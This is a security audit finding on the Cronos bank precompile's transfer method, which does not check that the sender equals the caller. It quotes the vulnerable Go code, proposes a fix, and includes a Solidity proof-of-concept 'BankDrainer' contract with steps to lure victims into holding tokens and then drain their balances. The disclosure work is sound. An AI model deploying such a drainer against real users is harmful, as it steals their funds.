### Title
Unauthenticated `sender` in Bank Precompile `transfer` Allows Any Contract to Drain Arbitrary Accounts - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the `BankContract` precompile accepts an arbitrary `sender` address from calldata and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that `sender == contract.Caller()`. Any unprivileged smart contract can therefore drain the `evm/<contract_address>` native bank balance of any victim address that holds those tokens.

---

### Finding Description

The bank precompile at `0x0000000000000000000000000000000000000064` exposes four methods: `mint`, `burn`, `balanceOf`, and `transfer`. The denom operated on is always `evm/<contract.Caller()>`, scoping each contract to its own token namespace.

In the `TransferMethodName` branch of `BankContract.Run()`:

```go
// x/cronos/keeper/precompiles/bank.go  lines 167-200
case TransferMethodName:
    args, err := method.Inputs.Unpack(contract.Input[4:])
    ...
    sender    := args[0].(common.Address)   // ← arbitrary, from calldata
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    ...
    from := sdk.AccAddress(sender.Bytes())  // ← no check: sender == contract.Caller()?
    to   := sdk.AccAddress(recipient.Bytes())
    ...
    denom := EVMDenom(contract.Caller())
    amt   := sdk.NewCoin(denom, ...)
    err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
        ...
        if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
            ...
        }
        return nil
    })
```

`sender` (and therefore `from`) is taken directly from the ABI-decoded calldata. There is **no assertion** that `sender == contract.Caller()`. The precompile unconditionally calls `bankKeeper.SendCoins(ctx, from, to, ...)`, transferring `evm/<callerContract>` tokens from the attacker-supplied `from` address to any `to` address.

Compare this with the `mint`/`burn` branch, which also does not verify that `args[0]` equals `contract.Caller()`, but the `transfer` case is the most directly exploitable because it moves tokens between arbitrary accounts rather than just minting/burning.

The intended usage pattern (as shown in `TestBank.sol`) is for a contract to pass `msg.sender` as the first argument:

```solidity
// integration_tests/contracts/contracts/TestBank.sol line 37
return bank.transfer(msg.sender, recipient, amount);
```

But nothing in the precompile enforces this. A malicious contract can pass any victim address as `sender`.

---

### Impact Explanation

**Critical** — Unauthorized transfer of precompile-controlled assets.

A malicious contract can call `bankPrecompile.transfer(victimAddress, attackerAddress, amount)` to move `evm/<maliciousContract>` native bank tokens from `victimAddress` to `attackerAddress` without any consent or authorization from `victimAddress`. This is a direct, unauthorized balance change for precompile-controlled assets.

---

### Likelihood Explanation

Any unprivileged user can deploy a contract and call the bank precompile's `transfer` method with an arbitrary `sender`. The only precondition is that the victim holds a non-zero balance of `evm/<maliciousContract>` tokens — which the attacker can engineer by deploying a contract that appears legitimate and lures users into calling `bank.mint()` through it (e.g., a token-wrapping contract). Once users hold the token, the attacker can drain them at will.

---

### Recommendation

Enforce that the `sender` argument equals `contract.Caller()` before executing the transfer:

```go
case TransferMethodName:
    ...
    sender    := args[0].(common.Address)
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    ...
+   if sender != contract.Caller() {
+       return nil, errors.New("sender must be the caller")
+   }
    from := sdk.AccAddress(sender.Bytes())
    ...
```

This mirrors how the `relayer` precompile's `exec` helper enforces caller identity:

```go
// x/cronos/keeper/precompiles/utils.go lines 46-48
caller := common.BytesToAddress(signers[0])
if caller != e.caller {
    return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", ...)
}
```

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
}

contract BankDrainer {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Lure victim into holding evm/<address(this)> tokens
    // (e.g., by offering a legitimate-looking wrap/unwrap service that calls bank.mint)

    // Step 2: Drain victim's evm/<address(this)> native bank balance
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim (arbitrary, not verified by precompile)
        // denom  = evm/<address(this)>  (scoped to this contract)
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `BankDrainer`.
2. Victim interacts with `BankDrainer` and accumulates `evm/<BankDrainer>` native bank tokens.
3. Attacker calls `BankDrainer.drain(victim, attacker, victimBalance)`.
4. The bank precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, coins)` with no authorization check.
5. Victim's `evm/<BankDrainer>` native bank balance is transferred to the attacker.

**Affected code:** [1](#0-0) 

**Missing guard (compare with the authenticated pattern in the relayer precompile):** [2](#0-1)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/utils.go (L46-49)
```go
	caller := common.BytesToAddress(signers[0])
	if caller != e.caller {
		return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", e.caller.Hex(), caller.Hex())
	}
```
